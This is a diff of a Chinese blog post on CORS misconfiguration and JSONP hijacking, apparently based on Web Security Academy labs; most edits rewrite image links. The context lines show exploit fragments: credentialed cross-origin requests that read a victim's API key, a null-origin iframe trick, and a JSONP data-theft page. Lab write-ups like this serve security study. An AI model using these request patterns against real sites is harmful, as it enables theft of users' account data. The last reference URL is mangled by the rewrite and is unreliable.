@@ -47,7 +47,7 @@ Access-Control-Allow-Credentials: true
 
 **配置讲解：**
 
-**Access-Control-Allow-Origin：*** 
+**Access-Control-Allow-Origin：***
 web浏览器将Access-Control-Allow-Origin与请求网站的来源进行比较，如果匹配则允许访问响应
 
 
@@ -60,7 +60,7 @@ web浏览器将Access-Control-Allow-Origin与请求网站的来源进行比较�
 
 
 
-**Access-Control-Allow-Credentials: true** 
+**Access-Control-Allow-Credentials: true**
 该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。
 
 设为`true`，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为`true`，如果服务器不要浏览器发送Cookie，删除该字段即可。
@@ -77,17 +77,17 @@ web浏览器将Access-Control-Allow-Origin与请求网站的来源进行比较�
 
 ##### 1.1 来源（origin)可任意更改的cors漏洞
 
-![1.1.1](1.1.1.png)
+![1.1.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/渗透测试/跨域漏洞那些事儿（cors,jsonp/1.1.1.png)
 
 该实验个人账户界面存在账户的api密钥，我们的目标就是获取到用户的api密钥
 
 
 
-![1.1.2](1.1.2.png)
+![1.1.2](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/渗透测试/跨域漏洞那些事儿（cors,jsonp/1.1.2.png)
 
 通过观察网站源码，发现api密码是通过一个ajax接口返回到页面的。**直接访问接口，并将请求来源跟改为任意网站可以获取到密钥，说明存在cors漏洞**
 
-![1.1.3](1.1.3.png)
+![1.1.3](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/渗透测试/跨域漏洞那些事儿（cors,jsonp/1.1.3.png)
 
 
 
@@ -116,7 +116,7 @@ web浏览器将Access-Control-Allow-Origin与请求网站的来源进行比较�
 
 获取到的密钥：
 
-![1.1.4](1.1.4.png)
+![1.1.4](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/渗透测试/跨域漏洞那些事儿（cors,jsonp/1.1.4.png)
 
 
 
@@ -126,7 +126,7 @@ web浏览器将Access-Control-Allow-Origin与请求网站的来源进行比较�
 
 origin标头不可以设置为任意标头了，尝试设置为null，此时可以获取到数据，说明存在请求来源可为null的cors漏洞
 
-![1.2.1](1.2.1.png)
+![1.2.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/渗透测试/跨域漏洞那些事儿（cors,jsonp/1.2.1.png)
 
 本地html测试：
 
@@ -144,7 +144,7 @@ console.log(this.responseText);
 </script>"></iframe>
 ```
 
-![1.2.1](1.2.2.png)
+![1.2.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/渗透测试/跨域漏洞那些事儿（cors,jsonp/1.2.2.png)
 
 此时我们继续采用实验一的攻击思路：
 
@@ -183,7 +183,7 @@ Access-Control-Allow-Origin: http://*.test.com
 
 在该实验三中将来源（origin)设置为任意子域，如：
 
-![1.3.1](1.3.1.png)
+![1.3.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/渗透测试/跨域漏洞那些事儿（cors,jsonp/1.3.1.png)
 
 设置为不存在的example子域，依旧可以访问敏感数据
 
@@ -191,7 +191,7 @@ Access-Control-Allow-Origin: http://*.test.com
 
 正好该网站的检查库存会将单价信息返回到子域，并且productId参数存在xss漏洞
 
-![1.3.2](1.3.2.png)
+![1.3.2](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/渗透测试/跨域漏洞那些事儿（cors,jsonp/1.3.2.png)
 
 
 
@@ -221,10 +221,10 @@ exp解释：
    document.location="http://stock.ac671f961e9e127a8052d5200051006e.web-security-academy.net/
    ?productId=4
    //采用原生js http请求将获取到的内容，保存到主机
-   <script>var req = new XMLHttpRequest(); 
-   req.onload = reqListener; 
+   <script>var req = new XMLHttpRequest();
+   req.onload = reqListener;
    //访问敏感信息
-   req.open('get','https://ac671f961e9e127a8052d5200051006e.web-security-academy.net/accountDetails',true); 
+   req.open('get','https://ac671f961e9e127a8052d5200051006e.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
 function reqListener() {
@@ -249,7 +249,7 @@ jsonp在造成方便的同时也造成了一定的安全的问题。jsonp劫持�
 
 某司因为业务需求，需要网站B从网站A中获取json数据，所以他们在A中实现了一个jsonp接口
 
-![2.1.1](2.1.1.png)
+![2.1.1](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/渗透测试/跨域漏洞那些事儿（cors,jsonp/2.1.1.png)
 
 接口代码如下：
 
@@ -297,7 +297,7 @@ function callback(result, methodName)
 
 效果如下：
 
-![2.1.2](2.1.2.png)
+![2.1.2](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/渗透测试/跨域漏洞那些事儿（cors,jsonp/2.1.2.png)
 
 此时通过jsonp接口，实现了跨域传输。然而该跨域传输过程存在很大的安全安全问题，因为对json参数调用者没有任何限制
 
@@ -307,9 +307,9 @@ function callback(result, methodName)
 
 2.2.1 打开collaborator client获取请求链接
 
-![2.1.3](2.1.3.png)
+![2.1.3](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/渗透测试/跨域漏洞那些事儿（cors,jsonp/2.1.3.png)
 
-![2.1.4](2.1.4.png)
+![2.1.4](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/渗透测试/跨域漏洞那些事儿（cors,jsonp/2.1.4.png)
 
 
 
@@ -337,7 +337,7 @@ function callback(result, methodName)
 
 
 
-![2.1.5](2.1.5.png)
+![2.1.5](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/渗透测试/跨域漏洞那些事儿（cors,jsonp/2.1.5.png)
 
 
 
@@ -366,7 +366,7 @@ jsonpcall
 
 访问网站首页
 
-![2.1.6](2.1.6.png)
+![2.1.6](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/渗透测试/跨域漏洞那些事儿（cors,jsonp/2.1.6.png)
 
 1. 打开network
 
@@ -374,7 +374,7 @@ jsonpcall
 
 3. 在搜索框中搜索常用jsonp参数
 
-   
+
 
 搜索到带有相关参数的链接，即可使用exp验证是否存在jsonp泄露。
 
@@ -409,7 +409,7 @@ document.body.appendChild(s);
 </html>
 ```
 
-![2.1.7](2.1.7.png)
+![2.1.7](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/渗透测试/跨域漏洞那些事儿（cors,jsonp/2.1.7.png)
 
 console.log获取到数据，说明存在该漏洞
 
@@ -421,4 +421,4 @@ https://blog.knownsec.com/2015/03/jsonp_security_technic/
 
 https://mp.weixin.qq.com/s/SuEpF3RIZIv2CcIUok8SoQ
 
-[https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/](https://www.k0rz3n.com/2018/06/05/由浅入深理解JSONP并拓展/)
+[https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/渗透测试/跨域漏洞那些事儿（cors,jsonp/https://www.k0rz3n.com/2018/06/05/由浅入深理解JSONP并拓展/)
